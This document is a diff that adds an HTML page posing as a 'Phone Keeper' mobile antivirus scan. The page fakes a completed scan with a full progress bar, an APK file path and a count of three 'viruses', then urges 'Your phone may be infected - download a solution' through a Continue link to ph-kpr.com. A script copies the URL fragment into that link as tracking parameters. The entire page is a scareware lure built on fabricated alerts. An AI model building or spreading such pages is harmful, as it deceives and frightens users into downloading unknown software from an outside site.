@@ -1,0 +1,138 @@
+<!DOCTYPE html><html class="fw-light"><head>
+  <base href="">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <title>Protejați telefonul</title>
+    <link rel="icon" type="image/x-icon" href="http://ph-kpr.com/mg/v3/english/img/favicon.ico">
+    <link rel="stylesheet" media="screen" type="text/css" href="unlike.css">
+    <link rel="stylesheet" media="screen" type="text/css" href="style.css">
+    <script src="all.js"></script>
+</head>
+
+<body class="light">
+    <div unstyle="cn-center" class="layer_9 header grid_100p">
+        <div unstyle="cn-space to_cent" class="grid_18r">
+            <div unstyle="cn-start to_cent" class="fs-x08 fw-normal">
+                <img src="icon_shield.png" class="grid_1r">
+                <div><span class="c-blue-light">PHONE </span> KEEPER</div>
+                &nbsp;<span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light">℗</span>
+            </div>
+            <div class="c-blue-dis fs-x08 tx-center fw-normal">v. 4.04.2</div>
+        </div>
+    </div>
+    <div unstyle="cn-center" class="content layer_3 c-white alert">
+        <div unstyle="cn-around_space" class="main_text grid_18r fw-normal alert">
+            <div id="message_1" class="layer_4 grid_100p tx-center info_message_1 fs-x14 fw-light part_1" style="display: none;"><span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light" style="vertical-align: super;color: #b9b9b9;">demo </span>Uploading <span id="dots" class="grid_1r">..</span></div>
+            <div id="message_2" class="layer_4 info_message_2 fw-light grid_100p tx-center part_2 fs-x12" style="display: block;">
+                <div><span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light" style="vertical-align: super;color: #b9b9b9;">demo </span>The upload is complete</div>
+
+            </div>
+            <div id="message_data" class="layer_4 grid_18r">
+                <div id="proc" class="grid_100p fs-x20 fw-thin tx-center">100%</div>
+                <div class="progress grid_100p">
+                    <div id="progress" style="width: 100%;"> </div>
+                </div>
+                <div id="folders" class="grid_100p c-silver fs-x07 tx-center">/storage/7/...app91application.apk</div>
+            </div>
+            <div id="total_counters" unstyle="cn-space to_cent" class="layer_4 grid_18r fs-x20 fw-thin">
+                <div id="counter_timer" class="">00:03.51</div>
+                <div unstyle="cn-center to_cent">
+                    <img src="virus.png">
+                    <div id="counter_total" class="fs-x20">3</div>
+                </div>
+            </div>
+        </div>
+        <div id="flame" class="part_2" style="display: block;"></div>
+    </div>
+    <div unstyle="container to_cent direct" class="footer">
+        <div unstyle="cn-around_around" class="usr_form footertop">
+            <div id="mo">
+                <div unstyle="cn-around_around to_cent" class="grid_18r form_data">
+                    <div class="tx-center">
+                        <div class="fw-bold">Your phone may be infected - download a solution</div>
+                    </div>
+                    <a id="link" class="grid_16r fs-x11 c-white tx-center ph-link" href="http://ph-kpr.com/mg/">Continue</a>
+                </div>
+            </div>
+        </div>
+        <div unstyle="cn-center_start" class="grid_18r fs-x08 fw-normal c-white">
+            <div unstyle="container to_cent" class="scanned grid_100p part_1 dis" style="display: none;">
+                <div class="icon_tools"></div>
+                <div class="grid_100p">System files</div>
+                <div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+                    <span>0</span>
+                    <div class="icon_status"></div>
+                </div>
+            </div>
+            <div unstyle="container to_cent" class="scanned grid_100p part_1 dis" style="display: none;">
+                <div class="icon_bag"></div>
+                <div class="grid_100p">Applications</div>
+                <div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+                    <span>0</span>
+                    <div class="icon_status"></div>
+                </div>
+            </div>
+            <div id="files" unstyle="container to_cent" class="scanned grid_100p alert dis">
+                <div class="icon_folder"></div>
+                <div class="grid_100p">User files</div>
+                <div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+                    <span id="counter_files">1</span>
+                    <div class="icon_status"></div>
+                </div>
+            </div>
+            <div id="internet" unstyle="container to_cent" class="scanned grid_100p alert dis">
+                <div class="icon_cloud"></div>
+                <div class="grid_100p">Internet files</div>
+                <div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+                    <span id="counter_internet">2</span>
+                    <div class="icon_status"></div>
+                </div>
+            </div>
+            <button id="scan_stop" class="part_1 c-white" style="font-size: 1.2rem; display: none;">Stop downloading</button>
+        </div>
+        <div id="extra" class="block_enable">
+            <style type="text/css">
+                #extra {
+                    width: 100%;
+                    margin-top: 1rem;
+                    text-align: center;
+                    font-family: Arial;
+                }
+
+                .block_enable {
+                    display: block;
+                }
+
+                .block_disable {
+                    display: none;
+                }
+
+                .exttra__text a {
+                    color: #999;
+                }
+            </style>
+
+        </div>
+    </div>
+
+    <script>
+        let link = 'http://ph-kpr.com/mg/';
+        let hash = window.location.hash;
+
+        hash = hash.replace(/%5D/g, ']');
+        hash = hash.replace(/%5B/g, '[');
+        hash = hash.replace(/amp;/g, '')
+        hash = hash.replace(/#/g, '?')
+        let params = link + hash;
+
+
+        var btnExitpoint = document.querySelector(".ph-link");
+        btnExitpoint.href = params;
+
+    </script>
+
+
+
+
+</body></html>
